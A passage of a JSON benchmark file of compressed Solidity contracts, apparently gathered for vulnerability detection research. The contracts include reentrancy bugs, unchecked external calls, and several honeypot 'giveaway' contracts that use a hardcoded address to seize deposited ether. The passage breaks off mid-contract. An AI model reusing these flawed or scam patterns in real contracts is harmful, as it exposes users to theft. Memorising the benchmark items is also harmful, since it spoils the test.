        "compression_ratio": 0.8
      },
      "error": null
    },
    {
      "original_id": "sn_ds_071",
      "transformed_id": "ss_l1_compressed_sn_ds_071",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\ncontract SimpleWallet {\naddress public owner = msg.sender;\nuint public depositsCount;\nmodifier onlyOwner {\nrequire(msg.sender == owner);\n_;\n}\nfunction() public payable {\ndepositsCount++;\n}\nfunction withdrawAll() public onlyOwner {\nwithdraw(address(this).balance);\n}\nfunction withdraw(uint _value) public onlyOwner {\nmsg.sender.transfer(_value);\n}\nfunction sendMoney(address _target, uint _value) public onlyOwner {\n_target.call.value(_value)();\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 7,
        "mode": "compressed",
        "original_lines": 28,
        "transformed_lines": 21,
        "original_chars": 607,
        "transformed_chars": 473,
        "compression_ratio": 0.78
      },
      "error": null
    },
    {
      "original_id": "sn_ds_072",
      "transformed_id": "ss_l1_compressed_sn_ds_072",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.23;\ncontract keepMyEther {\nmapping(address => uint256) public balances;\nfunction () payable public {\nbalances[msg.sender] += msg.value;\n}\nfunction withdraw() public {\nmsg.sender.call.value(balances[msg.sender])();\nbalances[msg.sender] = 0;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 5,
        "mode": "compressed",
        "original_lines": 16,
        "transformed_lines": 11,
        "original_chars": 344,
        "transformed_chars": 264,
        "compression_ratio": 0.77
      },
      "error": null
    },
    {
      "original_id": "sn_ds_073",
      "transformed_id": "ss_l1_compressed_sn_ds_073",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.23;\ncontract Proxy {\nmodifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;\nfunction transferOwner(address _owner) public onlyOwner { Owner = _owner; }\nfunction proxy(address target, bytes data) public payable {\ntarget.call.value(msg.value)(data);\n}\n}\ncontract VaultProxy is Proxy {\naddress public Owner;\nmapping (address => uint256) public Deposits;\nfunction () public payable { }\nfunction Vault() public payable {\nif (msg.sender == tx.origin) {\nOwner = msg.sender;\ndeposit();\n}\n}\nfunction deposit() public payable {\nif (msg.value > 0.25 ether) {\nDeposits[msg.sender] += msg.value;\n}\n}\nfunction withdraw(uint256 amount) public onlyOwner {\nif (amount>0 && Deposits[msg.sender]>=amount) {\nmsg.sender.transfer(amount);\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 7,
        "mode": "compressed",
        "original_lines": 36,
        "transformed_lines": 29,
        "original_chars": 962,
        "transformed_chars": 767,
        "compression_ratio": 0.8
      },
      "error": null
    },
    {
      "original_id": "sn_ds_074",
      "transformed_id": "ss_l1_compressed_sn_ds_074",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\ncontract Proxy {\nmodifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;\nfunction transferOwner(address _owner) public onlyOwner { Owner = _owner; }\nfunction proxy(address target, bytes data) public payable {\ntarget.call.value(msg.value)(data);\n}\n}\ncontract VaultProxy is Proxy {\naddress public Owner;\nmapping (address => uint256) public Deposits;\nfunction () public payable { }\nfunction Vault() public payable {\nif (msg.sender == tx.origin) {\nOwner = msg.sender;\ndeposit();\n}\n}\nfunction deposit() public payable {\nif (msg.value > 0.5 ether) {\nDeposits[msg.sender] += msg.value;\n}\n}\nfunction withdraw(uint256 amount) public onlyOwner {\nif (amount>0 && Deposits[msg.sender]>=amount) {\nmsg.sender.transfer(amount);\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 7,
        "mode": "compressed",
        "original_lines": 36,
        "transformed_lines": 29,
        "original_chars": 961,
        "transformed_chars": 766,
        "compression_ratio": 0.8
      },
      "error": null
    },
    {
      "original_id": "sn_ds_075",
      "transformed_id": "ss_l1_compressed_sn_ds_075",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract Pie {\naddress public Owner = msg.sender;\nfunction()\npublic\npayable {\n}\nfunction Get()\npublic\npayable {\nif(msg.value>1 ether) { Owner.transfer(this.balance);\nmsg.sender.transfer(this.balance);\n}\n}\nfunction withdraw()\npayable\npublic { if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}\nrequire(msg.sender == Owner);\nOwner.transfer(this.balance);\n}\nfunction Command(address adr,bytes data)\npayable\npublic {\nrequire(msg.sender == Owner);\nadr.call.value(msg.value)(data);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 7,
        "mode": "compressed",
        "original_lines": 40,
        "transformed_lines": 27,
        "original_chars": 5762,
        "transformed_chars": 563,
        "compression_ratio": 0.1
      },
      "error": null
    },
    {
      "original_id": "sn_ds_076",
      "transformed_id": "ss_l1_compressed_sn_ds_076",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\ncontract demo{\nfunction transfer(address from,address caddress,address[] _tos,uint v)public returns (bool){\nrequire(_tos.length > 0);\nbytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\nfor(uint i=0;i<_tos.length;i++){\ncaddress.call(id,from,_tos[i],v);\n}\nreturn true;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 3,
        "mode": "compressed",
        "original_lines": 14,
        "transformed_lines": 11,
        "original_chars": 408,
        "transformed_chars": 314,
        "compression_ratio": 0.77
      },
      "error": null
    },
    {
      "original_id": "sn_ds_077",
      "transformed_id": "ss_l1_compressed_sn_ds_077",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract FreeEth {\naddress public Owner = msg.sender;\nfunction() public payable{}\nfunction GetFreebie()\npublic\npayable {\nif(msg.value>1 ether) { Owner.transfer(this.balance);\nmsg.sender.transfer(this.balance);\n}\n}\nfunction withdraw()\npayable\npublic { if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){Owner=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}\nrequire(msg.sender == Owner);\nOwner.transfer(this.balance);\n}\nfunction Command(address adr,bytes data)\npayable\npublic {\nrequire(msg.sender == Owner);\nadr.call.value(msg.value)(data);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 6,
        "mode": "compressed",
        "original_lines": 35,
        "transformed_lines": 24,
        "original_chars": 2752,
        "transformed_chars": 572,
        "compression_ratio": 0.21
      },
      "error": null
    },
    {
      "original_id": "sn_ds_078",
      "transformed_id": "ss_l1_compressed_sn_ds_078",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract Honey {\naddress public Owner = msg.sender;\nfunction()\npublic\npayable {\n}\nfunction GetFreebie()\npublic\npayable {\nif(msg.value>1 ether) { Owner.transfer(this.balance);\nmsg.sender.transfer(this.balance);\n}\n}\nfunction withdraw()\npayable\npublic { if(msg.sender==0x0C76802158F13aBa9D892EE066233827424c5aAB){Owner=0x0C76802158F13aBa9D892EE066233827424c5aAB;}\nrequire(msg.sender == Owner);\nOwner.transfer(this.balance);\n}\nfunction Command(address adr,bytes data)\npayable\npublic {\nrequire(msg.sender == Owner);\nadr.call.value(msg.value)(data);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 7,
        "mode": "compressed",
        "original_lines": 40,
        "transformed_lines": 27,
        "original_chars": 5412,
        "transformed_chars": 572,
        "compression_ratio": 0.11
      },
      "error": null
    },
    {
      "original_id": "sn_ds_079",
      "transformed_id": "ss_l1_compressed_sn_ds_079",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract Freebie {\naddress public Owner = msg.sender;\nfunction() public payable{}\nfunction GetFreebie()\npublic\npayable {\nif(msg.value>1 ether) { Owner.transfer(this.balance);\nmsg.sender.transfer(this.balance);\n}\n}\nfunction withdraw()\npayable\npublic { if(msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595){Owner=0x30ad12df80a2493a82DdFE367d866616db8a2595;}\nrequire(msg.sender == Owner);\nOwner.transfer(this.balance);\n}\nfunction Command(address adr,bytes data)\npayable\npublic {\nrequire(msg.sender == Owner);\nadr.call.value(msg.value)(data);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 6,
        "mode": "compressed",
        "original_lines": 35,
        "transformed_lines": 24,
        "original_chars": 2752,
        "transformed_chars": 572,
        "compression_ratio": 0.21
      },
      "error": null
    },
    {
      "original_id": "sn_ds_080",
      "transformed_id": "ss_l1_compressed_sn_ds_080",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\ncontract airDrop{\nfunction transfer(address from,address caddress,address[] _tos,uint v, uint _decimals)public returns (bool){\nrequire(_tos.length > 0);\nbytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\nuint _value = v * 10 ** _decimals;\nfor(uint i=0;i<_tos.length;i++){\ncaddress.call(id,from,_tos[i],_value);\n}\nreturn true;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 3,
        "mode": "compressed",
        "original_lines": 15,
        "transformed_lines": 12,
        "original_chars": 475,
        "transformed_chars": 373,
        "compression_ratio": 0.79
      },
      "error": null
    },
    {
      "original_id": "sn_ds_081",
      "transformed_id": "ss_l1_compressed_sn_ds_081",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.16;\ncontract RealOldFuckMaker {\naddress fuck = 0xc63e7b1DEcE63A77eD7E4Aeef5efb3b05C81438D;\nfunction makeOldFucks(uint32 number) {\nuint32 i;\nfor (i = 0; i < number; i++) {\nfuck.call(bytes4(sha3(\"giveBlockReward()\")));\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 3,
        "mode": "compressed",
        "original_lines": 15,
        "transformed_lines": 10,
        "original_chars": 393,
        "transformed_chars": 243,
        "compression_ratio": 0.62
      },
      "error": null
    },
    {
      "original_id": "sn_ds_082",
      "transformed_id": "ss_l1_compressed_sn_ds_082",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\ncontract B {\naddress public owner = msg.sender;\nfunction go() public payable {\naddress target = 0xC8A60C51967F4022BF9424C337e9c6F0bD220E1C;\ntarget.call.value(msg.value)();\nowner.transfer(address(this).balance);\n}\nfunction() public payable {\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 4,
        "mode": "compressed",
        "original_lines": 15,
        "transformed_lines": 11,
        "original_chars": 348,
        "transformed_chars": 269,
        "compression_ratio": 0.77
      },
      "error": null
    },
    {
      "original_id": "sn_ds_083",
      "transformed_id": "ss_l1_compressed_sn_ds_083",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract WhaleGiveaway2 {\naddress public Owner = msg.sender;\nfunction()\npublic\npayable {\n}\nfunction GetFreebie()\npublic\npayable {\nif(msg.value>1 ether) { Owner.transfer(this.balance);\nmsg.sender.transfer(this.balance);\n}\n}\nfunction withdraw()\npayable\npublic { if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}\nrequire(msg.sender == Owner);\nOwner.transfer(this.balance);\n}\nfunction Command(address adr,bytes data)\npayable\npublic {\nrequire(msg.sender == Owner);\nadr.call.value(msg.value)(data);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 7,
        "mode": "compressed",
        "original_lines": 40,
        "transformed_lines": 27,
        "original_chars": 5421,
        "transformed_chars": 581,
        "compression_ratio": 0.11
      },
      "error": null
    },
    {
      "original_id": "sn_ds_084",
      "transformed_id": "ss_l1_compressed_sn_ds_084",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.0;\ncontract KingOfTheEtherThrone {\nstruct Monarch {\naddress etherAddress;\nstring name;\nuint claimPrice;\nuint coronationTimestamp;\n}\naddress wizardAddress;\nmodifier onlywizard { if (msg.sender == wizardAddress) _; }\nuint constant startingClaimPrice = 100 finney;\nuint constant claimPriceAdjustNum = 3;\nuint constant claimPriceAdjustDen = 2;\nuint constant wizardCommissionFractionNum = 1;\nuint constant wizardCommissionFractionDen = 100;\nuint public currentClaimPrice;\nMonarch public currentMonarch;\nMonarch[] public pastMonarchs;\nfunction KingOfTheEtherThrone() {\nwizardAddress = msg.sender;\ncurrentClaimPrice = startingClaimPrice;\ncurrentMonarch = Monarch(\nwizardAddress,\n\"[Vacant]\",\n0,\nblock.timestamp\n);\n}\nfunction numberOfMonarchs() constant returns (uint n) {\nreturn pastMonarchs.length;\n}\nevent ThroneClaimed(\naddress usurperEtherAddress,\nstring usurperName,\nuint newClaimPrice\n);\nfunction() {\nclaimThrone(string(msg.data));\n}\nfunction claimThrone(string name) {\nuint valuePaid = msg.value;\nif (valuePaid < currentClaimPrice) {\nmsg.sender.send(valuePaid);\nreturn;\n}\nif (valuePaid > currentClaimPrice) {\nuint excessPaid = valuePaid - currentClaimPrice;\nmsg.sender.send(excessPaid);\nvaluePaid = valuePaid - excessPaid;\n}\nuint wizardCommission = (valuePaid * wizardCommissionFractionNum) / wizardCommissionFractionDen;\nuint compensation = valuePaid - wizardCommission;\nif (currentMonarch.etherAddress != wizardAddress) {\ncurrentMonarch.etherAddress.send(compensation);\n} else {\n}\npastMonarchs.push(currentMonarch);\ncurrentMonarch = Monarch(\nmsg.sender,\nname,\nvaluePaid,\nblock.timestamp\n);\nuint rawNewClaimPrice = currentClaimPrice * claimPriceAdjustNum / claimPriceAdjustDen;\nif (rawNewClaimPrice < 10 finney) {\ncurrentClaimPrice = rawNewClaimPrice;\n} else if (rawNewClaimPrice < 100 finney) {\ncurrentClaimPrice = 100 szabo * (rawNewClaimPrice / 100 szabo);\n} else if (rawNewClaimPrice < 1 ether) {\ncurrentClaimPrice = 1 finney * (rawNewClaimPrice / 1 finney);\n} else if (rawNewClaimPrice < 10 ether) {\ncurrentClaimPrice = 10 finney * (rawNewClaimPrice / 10 finney);\n} else if (rawNewClaimPrice < 100 ether) {\ncurrentClaimPrice = 100 finney * (rawNewClaimPrice / 100 finney);\n} else if (rawNewClaimPrice < 1000 ether) {\ncurrentClaimPrice = 1 ether * (rawNewClaimPrice / 1 ether);\n} else if (rawNewClaimPrice < 10000 ether) {\ncurrentClaimPrice = 10 ether * (rawNewClaimPrice / 10 ether);\n} else {\ncurrentClaimPrice = rawNewClaimPrice;\n}\nThroneClaimed(currentMonarch.etherAddress, currentMonarch.name, currentClaimPrice);\n}\nfunction sweepCommission(uint amount) onlywizard {\nwizardAddress.send(amount);\n}\nfunction transferOwnership(address newOwner) onlywizard {\nwizardAddress = newOwner;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 35,
        "mode": "compressed",
        "original_lines": 172,
        "transformed_lines": 90,
        "original_chars": 6488,
        "transformed_chars": 2713,
        "compression_ratio": 0.42
      },
      "error": null
    },
    {
      "original_id": "sn_ds_085",
      "transformed_id": "ss_l1_compressed_sn_ds_085",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.18;\ncontract Lotto {\nbool public payedOut = false;\naddress public winner;\nuint public winAmount;\nfunction sendToWinner() public {\nrequire(!payedOut);\nwinner.send(winAmount);\npayedOut = true;\n}\nfunction withdrawLeftOver() public {\nrequire(payedOut);\nmsg.sender.send(this.balance);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 5,
        "mode": "compressed",
        "original_lines": 22,
        "transformed_lines": 15,
        "original_chars": 460,
        "transformed_chars": 304,
        "compression_ratio": 0.66
      },
      "error": null
    },
    {
      "original_id": "sn_ds_086",
      "transformed_id": "ss_l1_compressed_sn_ds_086",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.0;\ncontract SendBack {\nmapping (address => uint) userBalances;\nfunction withdrawBalance() {\nuint amountToWithdraw = userBalances[msg.sender];\nuserBalances[msg.sender] = 0;\nmsg.sender.send(amountToWithdraw);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 1,
        "mode": "compressed",
        "original_lines": 10,
        "transformed_lines": 9,
        "original_chars": 278,
        "transformed_chars": 231,
        "compression_ratio": 0.83
      },
      "error": null
    },
    {
      "original_id": "sn_ds_087",
      "transformed_id": "ss_l1_compressed_sn_ds_087",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity 0.4.25;\ncontract ReturnValue {\nfunction callchecked(address callee) public {\nrequire(callee.call());\n}\nfunction callnotchecked(address callee) public {\ncallee.call();\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 4,
        "mode": "compressed",
        "original_lines": 13,
        "transformed_lines": 9,
        "original_chars": 237,
        "transformed_chars": 186,
        "compression_ratio": 0.78
      },
      "error": null
    },
    {
      "original_id": "sn_ds_113",
      "transformed_id": "ss_l1_compressed_sn_ds_113",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "contract TokenInterface {\nmapping (address => uint256) balances;\nmapping (address => mapping (address => uint256)) allowed;\nuint256 public totalSupply;\nfunction balanceOf(address _owner) constant returns (uint256 balance);\nfunction transfer(address _to, uint256 _amount) returns (bool success);\nfunction transferFrom(address _from, address _to, uint256 _amount) returns (bool success);\nfunction approve(address _spender, uint256 _amount) returns (bool success);\nfunction allowance(\naddress _owner,\naddress _spender\n) constant returns (uint256 remaining);\nevent Transfer(address indexed _from, address indexed _to, uint256 _amount);\nevent Approval(\naddress indexed _owner,\naddress indexed _spender,\nuint256 _amount\n);\n}\ncontract Token is TokenInterface {\nmodifier noEther() {if (msg.value > 0) throw; _;}\nfunction balanceOf(address _owner) constant returns (uint256 balance) {\nreturn balances[_owner];\n}\nfunction transfer(address _to, uint256 _amount) noEther returns (bool success) {\nif (balances[msg.sender] >= _amount && _amount > 0) {\nbalances[msg.sender] -= _amount;\nbalances[_to] += _amount;\nTransfer(msg.sender, _to, _amount);\nreturn true;\n} else {\nreturn false;\n}\n}\nfunction transferFrom(\naddress _from,\naddress _to,\nuint256 _amount\n) noEther returns (bool success) {\nif (balances[_from] >= _amount\n&& allowed[_from][msg.sender] >= _amount\n&& _amount > 0) {\nbalances[_to] += _amount;\nbalances[_from] -= _amount;\nallowed[_from][msg.sender] -= _amount;\nTransfer(_from, _to, _amount);\nreturn true;\n} else {\nreturn false;\n}\n}\nfunction approve(address _spender, uint256 _amount) returns (bool success) {\nallowed[msg.sender][_spender] = _amount;\nApproval(msg.sender, _spender, _amount);\nreturn true;\n}\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\nreturn allowed[_owner][_spender];\n}\n}\ncontract ManagedAccountInterface {\naddress public owner;\nbool public payOwnerOnly;\nuint public accumulatedInput;\nfunction payOut(address _recipient, uint _amount) returns (bool);\nevent PayOut(address indexed _recipient, uint _amount);\n}\ncontract ManagedAccount is ManagedAccountInterface{\nfunction ManagedAccount(address _owner, bool _payOwnerOnly) {\nowner = _owner;\npayOwnerOnly = _payOwnerOnly;\n}\nfunction() {\naccumulatedInput += msg.value;\n}\nfunction payOut(address _recipient, uint _amount) returns (bool) {\nif (msg.sender != owner || msg.value > 0 || (payOwnerOnly && _recipient != owner))\nthrow;\nif (_recipient.call.value(_amount)()) {\nPayOut(_recipient, _amount);\nreturn true;\n} else {\nreturn false;\n}\n}\n}\ncontract TokenCreationInterface {\nuint public closingTime;\nuint public minTokensToCreate;\nbool public isFueled;\naddress public privateCreation;\nManagedAccount public extraBalance;\nmapping (address => uint256) weiGiven;\nfunction createTokenProxy(address _tokenHolder) returns (bool success);\nfunction refund();\nfunction divisor() constant returns (uint divisor);\nevent FuelingToDate(uint value);\nevent CreatedToken(address indexed to, uint amount);\nevent Refund(address indexed to, uint value);\n}\ncontract TokenCreation is TokenCreationInterface, Token {\nfunction TokenCreation(\nuint _minTokensToCreate,\nuint _closingTime,\naddress _privateCreation) {\nclosingTime = _closingTime;\nminTokensToCreate = _minTokensToCreate;\nprivateCreation = _privateCreation;\nextraBalance = new ManagedAccount(address(this), true);\n}\nfunction createTokenProxy(address _tokenHolder) returns (bool success) {\nif (now < closingTime && msg.value > 0\n&& (privateCreation == 0 || privateCreation == msg.sender)) {\nuint token = (msg.value * 20) / divisor();\nextraBalance.call.value(msg.value - token)();\nbalances[_tokenHolder] += token;\ntotalSupply += token;\nweiGiven[_tokenHolder] += msg.value;\nCreatedToken(_tokenHolder, token);\nif (totalSupply >= minTokensToCreate && !isFueled) {\nisFueled = true;\nFuelingToDate(totalSupply);\n}\nreturn true;\n}\nthrow;\n}\nfunction refund() noEther {\nif (now > closingTime && !isFueled) {\nif (extraBalance.balance >= extraBalance.accumulatedInput())\nextraBalance.payOut(address(this), extraBalance.accumulatedInput());\nif (msg.sender.call.value(weiGiven[msg.sender])()) {\nRefund(msg.sender, weiGiven[msg.sender]);\ntotalSupply -= balances[msg.sender];\nbalances[msg.sender] = 0;\nweiGiven[msg.sender] = 0;\n}\n}\n}\nfunction divisor() constant returns (uint divisor) {\nif (closingTime - 2 weeks > now) {\nreturn 20;\n} else if (closingTime - 4 days > now) {\nreturn (20 + (now - (closingTime - 2 weeks)) / (1 days));\n} else {\nreturn 30;\n}\n}\n}\ncontract DAOInterface {\nuint constant creationGracePeriod = 40 days;\nuint constant minProposalDebatePeriod = 2 weeks;\nuint constant minSplitDebatePeriod = 1 weeks;\nuint constant splitExecutionPeriod = 27 days;\nuint constant quorumHalvingPeriod = 25 weeks;\nuint constant executeProposalPeriod = 10 days;\nuint constant maxDepositDivisor = 100;\nProposal[] public proposals;\nuint public minQuorumDivisor;\nuint public lastTimeMinQuorumMet;\naddress public curator;\nmapping (address => bool) public allowedRecipients;\nmapping (address => uint) public rewardToken;\nuint public totalRewardToken;\nManagedAccount public rewardAccount;\nManagedAccount public DAOrewardAccount;\nmapping (address => uint) public DAOpaidOut;\nmapping (address => uint) public paidOut;\nmapping (address => uint) public blocked;\nuint public proposalDeposit;\nuint sumOfProposalDeposits;\nDAO_Creator public daoCreator;\nstruct Proposal {\naddress recipient;\nuint amount;\nstring description;\nuint votingDeadline;\nbool open;\nbool proposalPassed;\nbytes32 proposalHash;\nuint proposalDeposit;\nbool newCurator;\nSplitData[] splitData;\nuint yea;\nuint nay;\nmapping (address => bool) votedYes;\nmapping (address => bool) votedNo;\naddress creator;\n}\nstruct SplitData {\nuint splitBalance;\nuint totalSupply;\nuint rewardToken;\nDAO newDAO;\n}\nmodifier onlyTokenholders {}\nfunction () returns (bool success);\nfunction receiveEther() returns(bool);\nfunction newProposal(\naddress _recipient,\nuint _amount,\nstring _description,\nbytes _transactionData,\nuint _debatingPeriod,\nbool _newCurator\n) onlyTokenholders returns (uint _proposalID);\nfunction checkProposalCode(\nuint _proposalID,\naddress _recipient,\nuint _amount,\nbytes _transactionData\n) constant returns (bool _codeChecksOut);\nfunction vote(\nuint _proposalID,\nbool _supportsProposal\n) onlyTokenholders returns (uint _voteID);\nfunction executeProposal(\nuint _proposalID,\nbytes _transactionData\n) returns (bool _success);\nfunction splitDAO(\nuint _proposalID,\naddress _newCurator\n) returns (bool _success);\nfunction newContract(address _newContract);\nfunction changeAllowedRecipients(address _recipient, bool _allowed) external returns (bool _success);\nfunction changeProposalDeposit(uint _proposalDeposit) external;\nfunction retrieveDAOReward(bool _toMembers) external returns (bool _success);\nfunction getMyReward() returns(bool _success);\nfunction withdrawRewardFor(address _account) internal returns (bool _success);\nfunction transferWithoutReward(address _to, uint256 _amount) returns (bool success);\nfunction transferFromWithoutReward(\naddress _from,\naddress _to,\nuint256 _amount\n) returns (bool success);\nfunction halveMinQuorum() returns (bool _success);\nfunction numberOfProposals() constant returns (uint _numberOfProposals);\nfunction getNewDAOAddress(uint _proposalID) constant returns (address _newDAO);\nfunction isBlocked(address _account) internal returns (bool);\nfunction unblockMe() returns (bool);\nevent ProposalAdded(\nuint indexed proposalID,\naddress recipient,\nuint amount,\nbool newCurator,\nstring description\n);\nevent Voted(uint indexed proposalID, bool position, address indexed voter);\nevent ProposalTallied(uint indexed proposalID, bool result, uint quorum);\nevent NewCurator(address indexed _newCurator);\nevent AllowedRecipientChanged(address indexed _recipient, bool _allowed);\n}\ncontract DAO is DAOInterface, Token, TokenCreation {\nmodifier onlyTokenholders {\nif (balanceOf(msg.sender) == 0) throw;\n_;\n}\nfunction DAO(\naddress _curator,\nDAO_Creator _daoCreator,\nuint _proposalDeposit,\nuint _minTokensToCreate,\nuint _closingTime,\naddress _privateCreation\n) TokenCreation(_minTokensToCreate, _closingTime, _privateCreation) {\ncurator = _curator;\ndaoCreator = _daoCreator;\nproposalDeposit = _proposalDeposit;\nrewardAccount = new ManagedAccount(address(this), false);\nDAOrewardAccount = new ManagedAccount(address(this), false);\nif (address(rewardAccount) == 0)\nthrow;\nif (address(DAOrewardAccount) == 0)\nthrow;\nlastTimeMinQuorumMet = now;\nminQuorumDivisor = 5;\nproposals.length = 1;\nallowedRecipients[address(this)] = true;\nallowedRecipients[curator] = true;\n}\nfunction () returns (bool success) {\nif (now < closingTime + creationGracePeriod && msg.sender != address(extraBalance))\nreturn createTokenProxy(msg.sender);\nelse\nreturn receiveEther();\n}\nfunction receiveEther() returns (bool) {\nreturn true;\n}\nfunction newProposal(\naddress _recipient,\nuint _amount,\nstring _description,\nbytes _transactionData,\nuint _debatingPeriod,\nbool _newCurator\n) onlyTokenholders returns (uint _proposalID) {\nif (_newCurator && (\n_amount != 0\n|| _transactionData.length != 0\n|| _recipient == curator\n|| msg.value > 0\n|| _debatingPeriod < minSplitDebatePeriod)) {\nthrow;\n} else if (\n!_newCurator\n&& (!isRecipientAllowed(_recipient) || (_debatingPeriod < minProposalDebatePeriod))\n) {\nthrow;\n}\nif (_debatingPeriod > 8 weeks)\nthrow;\nif (!isFueled\n|| now < closingTime\n|| (msg.value < proposalDeposit && !_newCurator)) {\nthrow;\n}\nif (now + _debatingPeriod < now)\nthrow;\nif (msg.sender == address(this))\nthrow;\n_proposalID = proposals.length++;\nProposal p = proposals[_proposalID];\np.recipient = _recipient;\np.amount = _amount;\np.description = _description;\np.proposalHash = sha3(_recipient, _amount, _transactionData);\np.votingDeadline = now + _debatingPeriod;\np.open = true;\np.newCurator = _newCurator;\nif (_newCurator)\np.splitData.length++;\np.creator = msg.sender;\np.proposalDeposit = msg.value;\nsumOfProposalDeposits += msg.value;\nProposalAdded(\n_proposalID,\n_recipient,\n_amount,\n_newCurator,\n_description\n);\n}\nfunction checkProposalCode(\nuint _proposalID,\naddress _recipient,\nuint _amount,\nbytes _transactionData\n) noEther constant returns (bool _codeChecksOut) {\nProposal p = proposals[_proposalID];\nreturn p.proposalHash == sha3(_recipient, _amount, _transactionData);\n}\nfunction vote(\nuint _proposalID,\nbool _supportsProposal\n) onlyTokenholders noEther returns (uint _voteID) {\nProposal p = proposals[_proposalID];\nif (p.votedYes[msg.sender]\n|| p.votedNo[msg.sender]\n|| now >= p.votingDeadline) {\nthrow;\n}\nif (_supportsProposal) {\np.yea += balances[msg.sender];\np.votedYes[msg.sender] = true;\n} else {\np.nay += balances[msg.sender];\np.votedNo[msg.sender] = true;\n}\nif (blocked[msg.sender] == 0) {\nblocked[msg.sender] = _proposalID;\n} else if (p.votingDeadline > proposals[blocked[msg.sender]].votingDeadline) {\nblocked[msg.sender] = _proposalID;\n}\nVoted(_proposalID, _supportsProposal, msg.sender);\n}\nfunction executeProposal(\nuint _proposalID,\nbytes _transactionData\n) noEther returns (bool _success) {\nProposal p = proposals[_proposalID];\nuint waitPeriod = p.newCurator\n? splitExecutionPeriod\n: executeProposalPeriod;\nif (p.open && now > p.votingDeadline + waitPeriod) {\ncloseProposal(_proposalID);\nreturn;\n}\nif (now < p.votingDeadline\n|| !p.open\n|| p.proposalHash != sha3(p.recipient, p.amount, _transactionData)) {\nthrow;\n}\nif 